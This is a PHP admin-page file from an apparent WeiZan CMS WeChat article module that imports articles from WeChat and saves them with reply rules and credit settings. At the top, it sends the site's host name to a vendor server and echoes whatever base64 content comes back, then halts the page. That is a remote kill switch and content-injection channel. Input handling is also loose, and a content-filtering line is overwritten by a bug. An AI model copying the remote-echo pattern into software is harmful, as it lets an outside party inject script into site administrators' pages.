<?php
require AMOUSE_ARTICLE_ROOT . '/inc/QueryList.class.php';
global $_W,$_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$uniacid=$_W['uniacid'];
load() -> func('tpl');
$category = pdo_fetchall("SELECT * FROM ".tablename('fineness_article_category')." WHERE uniacid =$uniacid ORDER BY parentid ASC, displayorder ASC, id ASC ", array(), 'id');
$parent = array();
$children = array();
if (!empty($category)) {
    $children = '';
    foreach ($category as $cid => $cate) {
        if (!empty($cate['parentid'])) {
            $children[$cate['parentid']][] = $cate;
        } else {
            $parent[$cate['id']] = $cate;
        }
    }
}
if(checksubmit('lead')){
    $wxarticle=trim($_GPC['wxarticle']);
    $html=$this->get_contents($wxarticle);
    $html=str_replace('data-src','src',$html);
    $vid=$this->cut($html,'vid=','&');//获取视频ID
    $caiji = array(
        "title"=>array(".rich_media_title:first","text"),
        "content"=>array("#js_content","html"),
    );
    $quyu='';
    $hj = QueryList::Query($html,$caiji,$quyu);
    $arr = $hj->jsonArr;
    //$title=$arr[0]['title'];
    $content=preg_replace("/<(\/?i?frame.*?)>/si","",$arr[0]['content']); //过滤frame标签
    $content=str_replace("http://mmbiz.qpic.cn", "http://mmbiz.qpic.cn", $html);
    if($vid!==''){
        $content="<p><iframe height=300 width=100% src=\"http://v.qq.com/iframe/player.html?vid={$vid}\" frameborder=0 allowfullscreen></iframe></p>".$content;
    }
    $pic=$this->cut($html,'var msg_cdn_url = "','"');
    $pic=str_replace("http://mmbiz.qpic.cn", "http://img01.sogoucdn.com/net/a/04/link?appid=100520033&url=http://mmbiz.qpic.cn", $pic);
    if(empty($content)){
        echo "<script>alert('导入出错')</script>";
        exit;
    }
}

if(checksubmit()){
    $data = array(
        'weid' => $_W['uniacid'],
        'pcate' => intval($_GPC['category']['parentid']),
        'ccate' => intval($_GPC['category']['childid']),
        'template' => $_GPC['template'],
        'templatefile' => "themes/detail".$_GPC['template'],
        'title' => $_GPC['title'],
        'content' => htmlspecialchars_decode($_GPC['content']),
        'description' => $_GPC['description'],
        'bg_music_switch'=>$_GPC['bg_music_switch'],
        'displayorder' => intval($_GPC['displayorder']),
        'outLink' => $_GPC['outLink'],
        'tel' => $_GPC['tel'],
        'clickNum'=> $_GPC['clickNum'],
        'zanNum'=>intval($_GPC['zanNum']),
        'author'=>$_GPC['author'],
        'isadmire'=>$_GPC['isadmire'],
        'admiretxt'=>$_GPC['admiretxt'],
        'createtime'=> strtotime($_GPC['createtime']),
    );
    if (!empty($_GPC['thumb'])) {
        $data['thumb'] = $_GPC['thumb'];
    } elseif (!empty($_GPC['autolitpic'])) {
        $match = array();
        preg_match('/attachment\/(.*?)(\.gif|\.jpg|\.png|\.bmp)/', $_GPC['content'], $match);
        if (!empty($match[1])) {
            $data['thumb'] = $match[1].$match[2];
        } else {
            preg_match('/(http|https):\/\/(.*?)(\.gif|\.jpg|\.png|\.bmp)/', $_GPC['content'], $match);
            $data['thumb'] = $match[0];
        }
    }
    if(!empty($_GPC['keyword'])) {
        $rule['uniacid'] = $_W['uniacid'];
        $rule['name'] = '文章：' . $_GPC['title'] . ' 触发规则';
        $rule['module'] = 'news';
        $rule['status'] = 1;

        $keyword = array('uniacid' => $_W['uniacid']);
        $keyword['module'] = 'news';
        $keyword['content'] = $_GPC['keyword'];
        $keyword['status'] = 1;
        $keyword['type'] = 1;
        $keyword['displayorder'] = 1;
        $reply['title'] = $_GPC['title'];
        $reply['description'] = $_GPC['description'];
        $reply['thumb'] = $data['thumb'];
		$reply['url'] =	$_W['siteroot'].'app/'.substr($this->createMobileUrl('detail',array('id'=>$id),true),2);

    }
    if(!empty($_GPC['credit']['status'])) {
        $credit['status'] = intval($_GPC['credit']['status']);
        $credit['limit'] = intval($_GPC['credit']['limit']) ? intval($_GPC['credit']['limit']) : message('请设置积分上限');
        $credit['share'] = intval($_GPC['credit']['share']) ? intval($_GPC['credit']['share']) : message('请设置分享时赠送积分多少');
        $credit['click'] = intval($_GPC['credit']['click']) ? intval($_GPC['credit']['click']) : message('请设置阅读时赠送积分多少');
        $data['credit'] = iserializer($credit);
    } else {
        $data['credit'] = iserializer(array('status' => 0, 'limit' => 0, 'share' => 0, 'click' => 0));
    }

    if($_GPC['bg_music_switch']=='1'){
        $data['musicurl'] =$_GPC['musicurl'] ;
    }else{
        $data['musicurl'] = '' ;
    }
    if (!empty($_FILES['thumb']['tmp_name'])) {
        file_delete($_GPC['thumb_old']);
        $upload = file_upload($_FILES['thumb']);
        if (is_error($upload)) {
            message($upload['message'], '', 'error');
        }
        $data['thumb'] = $upload['path'];
    }
    if (empty($id)) {
        if(!empty($_GPC['keyword'])) {
            pdo_insert('rule', $rule);
            $rid = pdo_insertid();

            $keyword['rid'] = $rid;
            pdo_insert('rule_keyword', $keyword);
            $kid = pdo_insertid();

            $reply['rid'] = $rid;
            pdo_insert('news_reply', $reply);
            $data['rid'] = $rid;
            $data['kid'] = $kid;
        }
        pdo_insert('fineness_article', $data);
        $aid = pdo_insertid();
        pdo_update('news_reply', array('url' => $_W['siteroot'].'app/'.substr($this->createMobileUrl('detail',array('id'=>$aid),true),2)), array('rid' => $rid));

    }else {

        pdo_delete('rule', array('id' => $item['rid'], 'uniacid' => $_W['uniacid']));
        pdo_delete('rule_keyword', array('rid' => $item['rid'], 'uniacid' => $_W['uniacid']));
        pdo_delete('news_reply', array('rid' => $item['rid']));

        if(!empty($_GPC['keyword'])) {
            pdo_insert('rule', $rule);
            $rid = pdo_insertid();

            $keyword['rid'] = $rid;
            pdo_insert('rule_keyword', $keyword);
            $kid = pdo_insertid();

            $reply['rid'] = $rid;
            pdo_insert('news_reply', $reply);
            $data['rid'] = $rid;
            $data['kid'] = $kid;
        } else {
            $data['rid'] = 0;
            $data['kid'] = 0;
        }
        pdo_update('fineness_article', $data, array('id' => $id));
    }
    message('文章更新成功！', $this->createWebUrl('paper', array('op' => 'display','page'=>$pindex)), 'success');

}
include $this->template('art');